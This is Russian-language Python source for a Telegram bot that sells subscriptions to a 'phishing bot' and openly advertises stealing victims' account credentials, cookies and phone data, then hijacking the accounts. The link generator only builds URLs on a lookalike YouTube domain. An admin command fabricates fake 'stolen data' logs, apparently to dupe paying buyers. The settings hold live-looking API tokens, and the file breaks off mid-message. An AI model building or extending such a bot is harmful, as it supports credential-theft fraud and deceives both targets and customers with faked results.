import logging
import aiohttp
import os
import asyncio
import random
import string
from aiogram import Bot, Dispatcher, types
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton, FSInputFile
from aiogram.filters import Command
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
import datetime
import hashlib

# Определяем директорию где находится код
BASE_DIR = os.path.dirname(os.path.abspath(__file__))

# --- НАСТРОЙКИ ---
API_TOKEN = '8514518192:AAFC2lbIxC8l2VgYUZVUA9Eb3izVWLG_-nY'
CRYPTO_PAY_TOKEN = '526811:AAatyx14fjIZ6GitsEvGO2CO72qBnNyHdIS'
ADMIN_ID = 8524326478

# Цены за подписки
SUBSCRIPTION_PRICES = {
    'start': 200,      # Начальная подписка - 200 рублей
    'basic': 500,      # Базовая подписка
    'pro': 1500,       # Pro подписка
    'premium': 5000    # Premium подписка
}

# Ограничения для подписок
SUBSCRIPTION_LIMITS = {
    'start': {
        'links': 30,            # 30 ссылок
        'lifetime': 7,          # 7 дней
        'link_lifetime': "1 день",  # Время жизни ссылок
        'features': [
            'Пробный период (30 ссылок)',
            'Низкая скорость генерации',
            'Базовый анти-детект',
            'Поддержка только YouTube',
            'Хранение данных 1 день'
        ]
    },
    'basic': {
        'links': 100,           # 100 ссылок
        'lifetime': 30,         # 30 дней
        'link_lifetime': "2-3 дня",  # Время жизни ссылок
        'features': [
            'Ограниченная генерация (100 ссылок)',
            'Стандартная скорость',
            'Базовый анти-детект',
            'Поддержка только YouTube',
            'Хранение данных 7 дней'
        ]
    },
    'pro': {
        'links': 500,           # 500 ссылок
        'lifetime': 90,         # 90 дней
        'link_lifetime': "5-7 дней",  # Время жизни ссылок
        'features': [
            'Улучшенная генерация (500 ссылок)',
            'Высокая скорость',
            'Продвинутый анти-детект',
            'Поддержка YouTube и соцсетей',
            'Хранение данных 30 дней',
            'Приоритетная очередь'
        ]
    },
    'premium': {
        'links': '∞',           # Безлимит
        'lifetime': 365,        # 365 дней
        'link_lifetime': "14-30+ дней",  # Время жизни ссылок
        'features': [
            'Безлимитная генерация ссылок',
            'Максимальная скорость',
            'Элитный анти-детект',
            'Поддержка всех платформ',
            'Вечное хранение данных',
            'Максимальный приоритет',
            'Персональная поддержка',
            'Кастомные домены'
        ]
    }
}

# --- БАЗА УСТРОЙСТВ ДЛЯ ГЕНЕРАЦИИ (150+ моделей) ---
PHONE_MODELS = [
    "Xiaomi Redmi 13c", "Xiaomi Redmi Note 12", "Xiaomi Redmi Note 11", "Xiaomi Redmi 9",
    "Xiaomi Redmi 10", "Xiaomi Mi 11", "Xiaomi Mi 10", "Xiaomi Mi 9", "Xiaomi 13 Pro",
    "Xiaomi 12T", "Xiaomi 11T", "Xiaomi Poco X5", "Xiaomi Poco X4", "Xiaomi Poco F5",
    "Xiaomi Poco F4", "Xiaomi Poco M5", "Xiaomi Poco M4", "Xiaomi Black Shark 5",
    "Samsung Galaxy S24 Ultra", "Samsung Galaxy S24+", "Samsung Galaxy S24", "Samsung Galaxy S23 Ultra",
    "Samsung Galaxy S23+", "Samsung Galaxy S23", "Samsung Galaxy S22 Ultra", "Samsung Galaxy S22+",
    "Samsung Galaxy S22", "Samsung Galaxy S21 Ultra", "Samsung Galaxy S21+", "Samsung Galaxy S21",
    "Samsung Galaxy A54", "Samsung Galaxy A53", "Samsung Galaxy A52", "Samsung Galaxy A34",
    "Samsung Galaxy A33", "Samsung Galaxy A15", "Samsung Galaxy A14", "Samsung Galaxy A13",
    "Samsung Galaxy Z Fold5", "Samsung Galaxy Z Flip5", "Samsung Galaxy Note20 Ultra",
    "iPhone 15 Pro Max", "iPhone 15 Pro", "iPhone 15 Plus", "iPhone 15",
    "iPhone 14 Pro Max", "iPhone 14 Pro", "iPhone 14 Plus", "iPhone 14",
    "iPhone 13 Pro Max", "iPhone 13 Pro", "iPhone 13", "iPhone 13 mini",
    "iPhone 12 Pro Max", "iPhone 12 Pro", "iPhone 12", "iPhone 12 mini",
    "iPhone 11 Pro Max", "iPhone 11 Pro", "iPhone 11", "iPhone XS Max", "iPhone XS",
    "iPad Pro 12.9", "iPad Pro 11", "iPad Air 5", "iPad 10", "iPad mini 6",
    "Google Pixel 8 Pro", "Google Pixel 8", "Google Pixel 7 Pro", "Google Pixel 7",
    "Google Pixel 6 Pro", "Google Pixel 6", "Google Pixel 5", "Google Pixel 4 XL",
    "OnePlus 12", "OnePlus 11", "OnePlus 10 Pro", "OnePlus 9 Pro", "OnePlus 9",
    "OnePlus Nord 3", "OnePlus Nord 2", "OnePlus Nord CE",
    "Huawei P60 Pro", "Huawei P50 Pro", "Huawei Mate 50 Pro", "Huawei Mate 40 Pro",
    "Huawei Nova 11", "Huawei Nova 10", "Huawei Nova 9", "Huawei Y9",
    "Oppo Find X7", "Oppo Find X6", "Oppo Reno 11", "Oppo Reno 10", "Oppo Reno 9",
    "Oppo A98", "Oppo A78", "Oppo A58", "Oppo A38",
    "Vivo X100 Pro", "Vivo X90 Pro", "Vivo V29", "Vivo V27", "Vivo Y100",
    "Sony Xperia 1 V", "Sony Xperia 5 V", "Sony Xperia 10 V", "Sony Xperia Pro-I",
    "Motorola Edge 40", "Motorola Edge 30", "Motorola Moto G84", "Motorola Moto G54",
    "Motorola Moto G14", "Motorola Razr 40 Ultra", "Motorola Razr 40",
    "Realme GT 5", "Realme GT 3", "Realme 11 Pro+", "Realme 10 Pro+", "Realme C67",
    "Honor Magic 5 Pro", "Honor 90", "Honor 80", "Honor X9a", "Honor X8",
    "Nothing Phone 2", "Nothing Phone 1", "Fairphone 5", "Asus ROG Phone 7",
    "Asus Zenfone 10", "ZTE Nubia Red Magic 8 Pro", "ZTE Nubia Z50",
    "LG V60 ThinQ", "LG G8X", "LG Velvet", "Nokia G60", "Nokia X30",
    "Tecno Phantom V Fold", "Tecno Camon 20 Pro", "Infinix GT 10 Pro",
    "Alcatel 3L", "CAT S62 Pro", "Blackview BV9900", "DOOGEE S98"
]

# --- БАЗА ИМЁН ДЛЯ ГЕНЕРАЦИИ ПОЧТ ---
FIRST_NAMES = [
    "alex", "ivan", "vladimir", "sergey", "dmitry", "andrey", "mikhail", "nikolay",
    "pavel", "artem", "maxim", "egor", "roman", "kirill", "denis", "anton",
    "oleg", "vitaly", "yuri", "vadim", "igor", "victor", "konstantin", "valery",
    "david", "daniel", "matvey", "timofey", "mark", "lev", "gleb", "arseny",
    "michael", "james", "robert", "john", "david", "richard", "thomas", "charles",
    "maria", "elena", "olga", "anna", "natalia", "irina", "ekaterina", "svetlana",
    "tatyana", "julia", "alexandra", "nadezhda", "kseniya", "viktoria", "polina",
    "jennifer", "patricia", "linda", "elizabeth", "susan", "jessica", "sarah"
]

LAST_NAMES = [
    "ivanov", "petrov", "sidorov", "smirnov", "volkov", "fedotov", "morozov",
    "vasiliev", "novikov", "mikhailov", "pavlov", "alexeev", "sokolov", "lebeev",
    "kozlov", "stepanov", "zaytsev", "vinogradov", "orlov", "andreev", "tarasov",
    "semenov", "egorov", "popov", "kuznetsov", "smith", "johnson", "williams",
    "brown", "jones", "garcia", "miller", "davis", "wilson", "martinez"
]

DOMAINS = ["gmail.com", "yahoo.com", "outlook.com", "hotmail.com", "mail.ru", "yandex.ru", "bk.ru", "list.ru"]

# Настройка логирования
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

bot = Bot(token=API_TOKEN)
storage = MemoryStorage()
dp = Dispatcher(storage=storage)

# Хранилище (в памяти)
user_balances = {}  # {user_id: баланс}
user_data_store = {}  # {user_id: данные пользователя}
user_generated_links = {}  # Сгенерированные ссылки пользователей
user_subscriptions = {}  # {user_id: {'type': тип, 'expiry': дата окончания, 'links_used': использовано, 'links_limit': лимит}}
pending_payments = {}  # {user_id: {'subscription_type': тип, 'invoice_id': id}}

# FSM для состояний
class UserStates(StatesGroup):
    waiting_for_youtube_url = State()
    waiting_for_amount = State()

# --- ФУНКЦИИ ДЛЯ ГЕНЕРАЦИИ ФЕЙК-ЛОГОВ ---

def generate_serial():
    """Генерирует серийный номер устройства"""
    prefixes = ["H", "S", "A", "R", "X", "Z", "M", "K", "L", "P", "T", "W", "Y", "F", "C", "D", "B", "N"]
    return f"{random.choice(prefixes)}{random.randint(10000000, 99999999)}"

def generate_dpp():
    """Генерирует DPP код"""
    return f"{random.choice(string.ascii_uppercase)}{random.randint(1000, 9999)}"

def generate_email():
    """Генерирует случайный email"""
    name_style = random.randint(1, 4)
    
    if name_style == 1:
        # Имя.фамилия
        first = random.choice(FIRST_NAMES)
        last = random.choice(LAST_NAMES)
        local = f"{first}.{last}"
    elif name_style == 2:
        # Имя_фамилия_цифры
        first = random.choice(FIRST_NAMES)
        last = random.choice(LAST_NAMES)
        local = f"{first}_{last}{random.randint(1, 999)}"
    elif name_style == 3:
        # просто имя_цифры
        first = random.choice(FIRST_NAMES)
        local = f"{first}{random.randint(10, 9999)}"
    else:
        # буквы + цифры
        letters = ''.join(random.choices(string.ascii_lowercase, k=random.randint(5, 10)))
        local = f"{letters}{random.randint(1, 999)}"
    
    domain = random.choice(DOMAINS)
    return f"{local}@{domain}"

def generate_password():
    """Генерирует случайный пароль"""
    patterns = [
        lambda: f"{random.choice(string.ascii_lowercase)}{random.choice(string.ascii_lowercase)}{random.randint(10, 99)}{''.join(random.choices(string.ascii_lowercase, k=2))}",
        lambda: f"{random.randint(100, 999)}{''.join(random.choices(string.ascii_letters, k=3))}",
        lambda: f"{random.choice(string.ascii_uppercase)}{random.randint(1000, 9999)}{random.choice(string.ascii_lowercase)}",
        lambda: f"{''.join(random.choices(string.ascii_lowercase, k=3))}{random.randint(100, 999)}",
        lambda: f"{random.randint(10, 99)}{random.choice(string.ascii_letters)}{random.randint(100, 999)}",
        lambda: f"{random.choice(string.ascii_uppercase)}{random.choice(string.ascii_lowercase)}{random.randint(1000, 9999)}",
        lambda: f"{''.join(random.choices(string.ascii_letters, k=4))}{random.randint(10, 99)}"
    ]
    return random.choice(patterns)()

def generate_phone_number():
    """Генерирует российский номер телефона"""
    prefixes = ["901", "902", "903", "904", "905", "906", "908", "909", 
                "910", "911", "912", "913", "914", "915", "916", "917", 
                "918", "919", "920", "921", "922", "923", "924", "925", 
                "926", "927", "928", "929", "930", "931", "932", "933", 
                "934", "935", "936", "937", "938", "939", "950", "951", 
                "952", "953", "954", "955", "956", "957", "958", "959", 
                "960", "961", "962", "963", "964", "965", "966", "967", 
                "968", "969", "970", "971", "972", "973", "974", "975", 
                "976", "977", "978", "979", "980", "981", "982", "983", 
                "984", "985", "986", "987", "988", "989", "990", "991", 
                "992", "993", "994", "995", "996", "997", "998", "999"]
    
    prefix = random.choice(prefixes)
    num1 = random.randint(100, 999)
    num2 = random.randint(10, 99)
    num3 = random.randint(10, 99)
    return f"+7{prefix}{num1}{num2}{num3}"

def generate_fake_log():
    """Генерирует фейковый лог с украденными данными"""
    
    # Генерируем номер жертвы # от 1 до 100
    victim_number = random.randint(1, 100)
    
    # Выбираем случайное устройство
    phone_model = random.choice(PHONE_MODELS)
    serial = generate_serial()
    dpp = generate_dpp()
    
    # Генерируем email и пароль (всегда есть)
    email = generate_email()
    email_password = generate_password()
    
    # Список соцсетей для возможного включения
    all_socials = [
        ("Facebook", f"{random.choice(FIRST_NAMES)}_{random.choice(LAST_NAMES)}", generate_password()),
        ("Twitter", f"@{random.choice(FIRST_NAMES)}{random.randint(100, 999)}", generate_password()),
        ("Viber", generate_phone_number(), None),
        ("WhatsApp", generate_phone_number(), None),
        ("Telegram", f"@{random.choice(FIRST_NAMES)}{random.randint(10, 99)}", None),
        ("Instagram", f"{random.choice(FIRST_NAMES)}_{random.randint(100, 999)}", generate_password()),
        ("TikTok", f"@{random.choice(FIRST_NAMES)}{random.randint(1000, 9999)}", generate_password()),
        ("Snapchat", f"{random.choice(FIRST_NAMES)}{random.randint(100, 999)}", generate_password())
    ]
    
    # Перемешиваем и выбираем случайное количество соцсетей (2-5)
    random.shuffle(all_socials)
    num_socials = random.randint(2, 5)
    selected_socials = all_socials[:num_socials]
    
    # Формируем сообщение
    log = f"New log-in #{victim_number}\n\n"
    log += f"{{Phone}} - {phone_model}\n"
    log += f"{{Serial number}} - {serial}\n-\n"
    log += f"[DPP] - {dpp}\n\n"
    
    # Добавляем email (всегда)
    log += f"[E-mail] - {email}\n"
    log += f"[password] - {email_password}\n\n"
    
    # Добавляем выбранные соцсети
    for social, username, pwd in selected_socials:
        if pwd:
            log += f"[{social}] - {username}\n"
            log += f"[password] - {pwd}\n"
        else:
            log += f"[{social}] - {username}\n"
    
    log += "\nNo data found yet"
    
    return log

# --- ФУНКЦИИ CRYPTOBOT ---

async def create_crypto_invoice(amount_rub, description):
    """Создает счет в CryptoBot на сумму в рублях"""
    url = "https://pay.crypt.bot/api/createInvoice"
    headers = {"Crypto-Pay-API-Token": CRYPTO_PAY_TOKEN}
    payload = {
        "amount": str(amount_rub),
        "fiat": "RUB",
        "currency_type": "fiat",
        "accepted_assets": "USDT,TON,BTC,ETH,LTC,BNB",
        "description": description,
        "allow_comments": False,
        "expires_in": 3600
    }
    
    try:
        async with aiohttp.ClientSession() as session:
            async with session.post(url, json=payload, headers=headers) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    return data['result']['pay_url'], data['result']['invoice_id']
                else:
                    logging.error(f"Ошибка CryptoBot API: {await resp.text()}")
                    return None, None
    except Exception as e:
        logging.error(f"Ошибка при создании инвойса: {e}")
        return None, None

async def check_crypto_payment(invoice_id):
    """Проверяет статус оплаты счета в CryptoBot"""
    url = f"https://pay.crypt.bot/api/getInvoices"
    headers = {"Crypto-Pay-API-Token": CRYPTO_PAY_TOKEN}
    payload = {
        "invoice_ids": invoice_id
    }
    
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url, headers=headers, params=payload) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    if data['result']['items']:
                        invoice = data['result']['items'][0]
                        return invoice['status'] == 'paid'
                return False
    except Exception as e:
        logging.error(f"Ошибка при проверке оплаты: {e}")
        return False

def generate_phishing_link(youtube_url, user_id):
    """Генерирует фишинг ссылку из YouTube URL"""
    # Проверяем активную подписку
    if user_id not in user_subscriptions:
        return None, "❌ У вас нет активной подписки!"
    
    subscription = user_subscriptions[user_id]
    
    # Проверяем срок действия
    expiry_date = datetime.datetime.strptime(subscription['expiry'], "%Y-%m-%d")
    if datetime.datetime.now() > expiry_date:
        return None, "❌ Ваша подписка истекла!"
    
    # Проверяем лимит ссылок
    if subscription['links_limit'] != '∞' and subscription['links_used'] >= subscription['links_limit']:
        return None, f"❌ Лимит ссылок исчерпан ({subscription['links_used']}/{subscription['links_limit']})!"
    
    # Создаем уникальный ID на основе URL и user_id
    unique_id = hashlib.md5(f"{youtube_url}{user_id}{datetime.datetime.now().timestamp()}".encode()).hexdigest()[:12]
    
    # Генерируем фишинг-ссылку
    phishing_domain = "youtube-premium-access.com"
    phishing_path = f"/watch/v={unique_id}"
    
    phishing_url = f"https://{phishing_domain}{phishing_path}"
    
    # Сохраняем в истории пользователя
    if user_id not in user_generated_links:
        user_generated_links[user_id] = []
    
    user_generated_links[user_id].append({
        'original': youtube_url,
        'phishing': phishing_url,
        'timestamp': datetime.datetime.now().strftime("%d.%m.%Y %H:%M"),
        'clicks': 0,
        'data_captured': []
    })
    
    # Увеличиваем счетчик использованных ссылок
    subscription['links_used'] += 1
    
    return phishing_url, None

# ============================================
# ФУНКЦИИ РАБОТЫ С ФАЙЛАМИ И КАРТИНКАМИ
# ============================================

def get_image_path(filename):
    """Возвращает полный путь к файлу изображения"""
    return os.path.join(BASE_DIR, filename)

def image_exists(filename):
    """Проверяет существование файла изображения"""
    return os.path.exists(get_image_path(filename))

async def send_photo_or_text(chat_id, image_filename, caption, reply_markup=None):
    """
    Универсальная функция отправки фото или текста
    Если фото не найдено, отправляет текстовое сообщение
    """
    try:
        # Проверяем существование файла
        full_path = get_image_path(image_filename)
        logging.info(f"Пытаюсь отправить фото: {full_path}")
        
        if os.path.exists(full_path):
            logging.info(f"Файл найден, размер: {os.path.getsize(full_path)} байт")
            # Используем FSInputFile для создания объекта файла
            photo = FSInputFile(full_path)
            
            return await bot.send_photo(
                chat_id=chat_id,
                photo=photo,
                caption=caption,
                reply_markup=reply_markup,
                parse_mode='HTML'
            )
        else:
            logging.warning(f"Файл {full_path} не найден")
    except Exception as e:
        logging.error(f"Ошибка при отправке фото {image_filename}: {e}", exc_info=True)
    
    # Если фото не найдено или ошибка, отправляем текстовое сообщение
    logging.info(f"Отправляю текстовое сообщение вместо фото: {image_filename}")
    return await bot.send_message(
        chat_id=chat_id,
        text=caption,
        reply_markup=reply_markup,
        parse_mode='HTML'
    )

async def delete_and_send_photo(chat_id, message_id, photo_path, caption, markup=None):
    """Удаляет старое сообщение и шлет новое с фото"""
    try:
        await bot.delete_message(chat_id, message_id)
    except Exception:
        pass
    return await send_photo_or_text(chat_id, photo_path, caption, markup)

# --- КЛАВИАТУРЫ ---

def get_main_keyboard():
    """Основная клавиатура с двумя кнопками"""
    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="💎 Купить подписку", callback_data="show_subscriptions")],
            [InlineKeyboardButton(text="💬 Поддержка", url="https://t.me/pabg_prodazha")]
        ]
    )
    return keyboard

def get_subscriptions_keyboard():
    """Клавиатура выбора подписки"""
    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text=f"🌟 START - {SUBSCRIPTION_PRICES['start']} ₽", callback_data="subscription_start")],
            [InlineKeyboardButton(text=f"🎯 Базовая - {SUBSCRIPTION_PRICES['basic']} ₽", callback_data="subscription_basic")],
            [InlineKeyboardButton(text=f"🚀 Pro - {SUBSCRIPTION_PRICES['pro']} ₽", callback_data="subscription_pro")],
            [InlineKeyboardButton(text=f"🏆 Premium - {SUBSCRIPTION_PRICES['premium']} ₽", callback_data="subscription_premium")],
            [InlineKeyboardButton(text="« Назад", callback_data="back_to_main")]
        ]
    )
    return keyboard

def get_subscription_details_keyboard(subscription_type):
    """Клавиатура с опциями покупки подписки"""
    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text=f"💎 Купить через CryptoBot", callback_data=f"buy_crypto_{subscription_type}")],
            [InlineKeyboardButton(text=f"💳 Купить картой (Админ)", callback_data=f"buy_card_{subscription_type}")],
            [InlineKeyboardButton(text="« Назад к подпискам", callback_data="show_subscriptions")]
        ]
    )
    return keyboard

def get_admin_payment_keyboard(subscription_type):
    """Клавиатура для оплаты через администратора"""
    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="👨‍💻 Написать админу", url="https://t.me/pabg_prodazha")],
            [InlineKeyboardButton(text="« Назад к подпискам", callback_data="show_subscriptions")]
        ]
    )
    return keyboard

def get_invoice_keyboard(subscription_type, invoice_id):
    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="💳 Оплатить в CryptoBot", callback_data=f"open_invoice_{invoice_id}")],
            [InlineKeyboardButton(text="🔄 Проверить оплату", callback_data=f"check_payment_{invoice_id}")],
            [InlineKeyboardButton(text="« Назад к подпискам", callback_data="show_subscriptions")]
        ]
    )
    return keyboard

# --- ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ---

async def delete_and_send(chat_id, message_id, text, markup=None):
    """Удаляет старое сообщение и шлет новое"""
    try:
        await bot.delete_message(chat_id, message_id)
    except Exception:
        pass
    return await bot.send_message(chat_id, text, reply_markup=markup, parse_mode='HTML')

def get_user_data(user_id):
    """Получает данные пользователя"""
    if user_id not in user_data_store:
        user_data_store[user_id] = {
            'name': f"Пользователь #{user_id % 10000:04d}",
            'id': str(user_id),
            'balance': user_balances.get(user_id, 0),
            'reg_date': datetime.datetime.now().strftime("%d.%m.%Y"),
            'total_spent': 0,
            'purchases_count': 0,
            'total_links': 0
        }
    return user_data_store[user_id]

def get_user_balance(user_id):
    """Получает баланс пользователя"""
    return user_balances.get(user_id, 0)

def get_subscription_info(user_id):
    """Получает информацию о подписке пользователя"""
    if user_id in user_subscriptions:
        subscription = user_subscriptions[user_id]
        expiry_date = datetime.datetime.strptime(subscription['expiry'], "%Y-%m-%d")
        days_left = (expiry_date - datetime.datetime.now()).days
        
        return {
            'type': subscription['type'],
            'expiry': subscription['expiry'],
            'days_left': max(0, days_left),
            'links_used': subscription['links_used'],
            'links_limit': subscription['links_limit']
        }
    return None

def format_bold_text(text):
    """Форматирует весь текст жирным шрифтом"""
    # Удаляем существующие теги <b> и </b>
    text = text.replace('<b>', '').replace('</b>', '')
    # Оборачиваем весь текст в теги <b>
    return f"<b>{text}</b>"

# --- ОБРАБОТЧИКИ ---

@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    welcome_text = format_bold_text("""
🚀 ФИШИНГ БОТ ДЛЯ СКАМА МАМОНТОВ И ЖЕРТВ

🎯 ПРОФЕССИОНАЛЬНЫЙ ИНСТРУМЕНТ ДЛЯ КРАЖИ ДАННЫХ:

⚡ КАК ЭТО РАБОТАЕТ:

1️⃣ Бот создает фишинг ссылку из YouTube URL
2️⃣ Вы отправляете ссылку жертве (мамонту)
3️⃣ Жертва переходит по ссылке
4️⃣ Бот автоматически ворует все данные:

🔐 КРАДУТСЯ ДАННЫЕ:
• Google/Gmail аккаунты
• Facebook профили
• Twitter (X) логины
• WhatsApp данные
• Номера телефонов
• Данные устройства
• Cookies и сессии

💰 ПОСЛЕ ПОЛУЧЕНИЯ ДАННЫХ:
• Входите в аккаунты жертвы
• Меняете пароли
• Получаете полный контроль
• Используете для своих целей

🛡️ ПРЕИМУЩЕСТВА БОТА:
• Полная автоматизация
• Не требует действий от жертвы
• Максимальная скрытность
• Данные в реальном времени
• Работает через любой YouTube URL

💎 ДЛЯ НАЧАЛА РАБОТЫ:
Купите подписку и начните скам мамонтов уже сегодня!
🌟 Доступна пробная START подписка всего за 200 ₽!
""")
    
    # Отправляем сообщение с картинкой
    await send_photo_or_text(message.chat.id, "photo1.png", welcome_text, get_main_keyboard())

@dp.message(Command("create"))
async def cmd_create(message: types.Message):
    """Команда для администратора - генерирует фейковый лог с украденными данными"""
    # Проверяем, что пользователь - администратор
    if message.from_user.id != ADMIN_ID:
        await message.answer("❌ У вас нет прав для использования этой команды.")
        return
    
    # Генерируем фейковый лог
    fake_log = generate_fake_log()
    
    # Отправляем его в чат
    await message.answer(f"<code>{fake_log}</code>", parse_mode='HTML')

# --- CALLBACK ОБРАБОТЧИКИ ---

@dp.callback_query(lambda callback_query: callback_query.data == 'back_to_main')
async def back_to_main(callback_query: types.CallbackQuery):
    welcome_text = format_bold_text("""
🚀 ФИШИНГ БОТ ДЛЯ СКАМА МАМОНТОВ И ЖЕРТВ

🎯 ПРОФЕССИОНАЛЬНЫЙ ИНСТРУМЕНТ ДЛЯ КРАЖИ ДАННЫХ:

⚡ КАК ЭТО РАБОТАЕТ:

1️⃣ Бот создает фишинг ссылку из YouTube URL
2️⃣ Вы отправляете ссылку жертве (мамонту)
3️⃣ Жертва переходит по ссылке
4️⃣ Бот автоматически ворует все данные:

🔐 КРАДУТСЯ ДАННЫЕ:
• Google/Gmail аккаунты
• Facebook профили
• Twitter (X) логины
• WhatsApp данные
• Номера телефонов
• Данные устройства
• Cookies и сессии

💰 ПОСЛЕ ПОЛУЧЕНИЯ ДАННЫХ:
• Входите в аккаунты жертвы
• Меняете пароли
• Получаете полный контроль
• Используете для своих целей

🛡️ ПРЕИМУЩЕСТВА БОТА:
• Полная автоматизация
• Не требует действий от жертвы
• Максимальная скрытность
• Данные в реальном времени
• Работает через любой YouTube URL

💎 ДЛЯ НАЧАЛА РАБОТЫ:
Купите подписку и начните скам мамонтов уже сегодня!
🌟 Доступна пробная START подписка всего за 200 ₽!
""")
    
    # Используем новую функцию для отправки фото
    await delete_and_send_photo(callback_query.message.chat.id, callback_query.message.message_id,
                              "photo1.png", welcome_text, get_main_keyboard())
    await callback_query.answer()

@dp.callback_query(lambda callback_query: callback_query.data == 'show_subscriptions')
async def show_subscriptions(callback_query: types.CallbackQuery):
    text = format_bold_text("""
💎 ВЫБЕРИТЕ ПОДПИСКУ ДЛЯ ФИШИНГА

Доступно 4 уровня подписок для скама мамонтов:

👇 Выберите подписку для покупки:
""")
    
    # Используем новую функцию для отправки фото
    await delete_and_send_photo(callback_query.message.chat.id, callback_query.message.message_id,
                              "photo3.png", text, get_subscriptions_keyboard())
    await callback_query.answer()

@dp.callback_query(lambda callback_query: callback_query.data.startswith('subscription_'))
async def subscription_details(callback_query: types.CallbackQuery):
    subscription_type = callback_query.data.replace('subscription_', '')
    
    if subscription_type in SUBSCRIPTION_PRICES:
        price = SUBSCRIPTION_PRICES[subscription_type]
        limits = SUBSCRIPTION_LIMITS[subscription_type]
        
        subscription_names = {
            'start': '🌟 START ПОДПИСКА (ПРОБНАЯ)',
            'basic': '🎯 БАЗОВАЯ ПОДПИСКА',
            'pro': '🚀 PRO ПОДПИСКА',
            'premium': '🏆 PREMIUM ПОДПИСКА'
        }
        
        text = format_bold_text(f"""
{subscription_names[subscription_type]}

💰 Цена: {price} ₽
🔗 Лимит ссылок: {limits['links']}
⏱️ Срок действия: {limits['lifetime']} дней
⏳ Время жизни ссылок: {limits['link_lifetime']}

✨ Включенные функции:
""")
        
        for feature in limits['features']:
            text += format_bold_text(f"• {feature}\n")
        
        await delete_and_send(callback_query.message.chat.id, callback_query.message.message_id,
                             text, get_subscription_details_keyboard(subscription_type))
    
    await callback_query.answer()

@dp.callback_query(lambda callback_query: callback_query.data.startswith('buy_crypto_'))
async def buy_subscription_crypto(callback_query: types.CallbackQuery):
    subscription_type = callback_query.data.replace('buy_crypto_', '')
    
    if subscription_type in SUBSCRIPTION_PRICES:
        price = SUBSCRIPTION_PRICES[subscription_type]
        user_id = callback_query.from_user.id
        
        await callback_query.answer("Создаем счет для оплаты...")
        
        description = f"Оплата {subscription_type} подписки Фишинг Бота"
        pay_url, invoice_id = await create_crypto_invoice(price, description)
        
        if pay_url and invoice_id:
            # Сохраняем информацию о платеже
            pending_payments[user_id] = {
                'subscription_type': subscription_type,
                'invoice_id': invoice_id,
                'amount': price,
                'payment_method': 'crypto'
            }
            
            invoice_text = format_bold_text(f"""
✅ СЧЕТ ДЛЯ ОПЛАТЫ СОЗДАН

💰 Сумма: {price} ₽
💎 Подписка: {subscription_type.upper()}
💳 Способ оплаты: CryptoBot
⏱️ Действителен: 60 минут

🔒 Безопасная оплата через CryptoBot:
• USDT (TRC20/ERC20) • TON • BTC
• ETH • LTC • BNB

🎁 После оплаты:
1. Подписка активируется автоматически
2. Вы получите уведомление
3. Сможете создавать фишинг ссылки

📞 При проблемах с оплатой: @pabg_prodazha
""")
            
            markup = InlineKeyboardMarkup(
                inline_keyboard=[
                    [InlineKeyboardButton(text="💳 Оплатить в CryptoBot", url=pay_url)],
                    [InlineKeyboardButton(text="🔄 Проверить оплату", callback_data=f"check_payment_{invoice_id}")],
                    [InlineKeyboardButton(text="« Назад к подпискам", callback_data="show_subscriptions")]
                ]
            )
            
            # Используем новую функцию для отправки фото
            await delete_and_send_photo(callback_query.message.chat.id, callback_query.message.message_id,
                                      "photo8.png", invoice_text, markup)
            
        else:
            await callback_query.answer("⚠️ Ошибка при создании счета. Попробуйте позже.", show_alert=True)
    
    await callback_query.answer()

@dp.callback_query(lambda callback_query: callback_query.data.startswith('buy_card_'))
async def buy_subscription_card(callback_query: types.CallbackQuery):
    """Обработчик покупки подписки картой через администратора"""
    subscription_type = callback_query.data.replace('buy_card_', '')
    
    if subscription_type in SUBSCRIPTION_PRICES:
        price = SUBSCRIPTION_PRICES[subscription_type]
        
        subscription_names = {
            'start': 'START (пробная)',
            'basic': 'BASIC',
            'pro': 'PRO',
            'premium': 'PREMIUM'
        }
        
        card_text = format_bold_text(f"""
💳 Оплата картой

💰 {price} ₽ за подписку {subscription_names[subscription_type]}

1. Жмите кнопку ниже
2. Пишите админу "Хочу {subscription_names[subscription_type]} подписку в фишинг боте"
3. Оплачивайте на карту
4. Скидываете скриншот оплаты
5. Через 5-15 мин у вас все работает

👨‍💻 Админ: @pabg_prodazha
""")
        
        await delete_and_send(callback_query.message.chat.id, callback_query.message.message_id,
                            card_text, get_admin_payment_keyboard(subscription_type))
    
    await callback_query.answer()

@dp.callback_query(lambda callback_query: callback_query.data.startswith('check_payment_'))
async def check_payment(callback_query: types.CallbackQuery):
    invoice_id = callback_query.data.replace('check_payment_', '')
    user_id = callback_query.from_user.id
    
    # Проверяем, есть ли такой ожидающий платеж
    if user_id in pending_payments and pending_payments[user_id]['invoice_id'] == invoice_id:
        # Проверяем оплату через CryptoBot API
        is_paid = await check_crypto_payment(invoice_id)
        
        if is_paid:
            # Активируем подписку
            subscription_type = pending_payments[user_id]['subscription_type']
            lifetime = SUBSCRIPTION_LIMITS[subscription_type]['lifetime']
            expiry_date = (datetime.datetime.now() + datetime.timedelta(days=lifetime)).strftime("%Y-%m-%d")
            
            # Активируем подписку
            user_subscriptions[user_id] = {
                'type': subscription_type,
                'expiry': expiry_date,
                'links_used': 0,
                'links_limit': SUBSCRIPTION_LIMITS[subscription_type]['links']
            }
            
            # Обновляем данные пользователя
            user_data = get_user_data(user_id)
            user_data['purchases_count'] += 1
            user_data['total_spent'] += SUBSCRIPTION_PRICES[subscription_type]
            
            # Удаляем из ожидающих платежей
            del pending_payments[user_id]
            
            subscription_names = {
                'start': 'START (пробная)',
                'basic': 'BASIC',
                'pro': 'PRO',
                'premium': 'PREMIUM'
            }
            
            success_text = format_bold_text(f"""
✅ ПОДПИСКА АКТИВИРОВАНА!

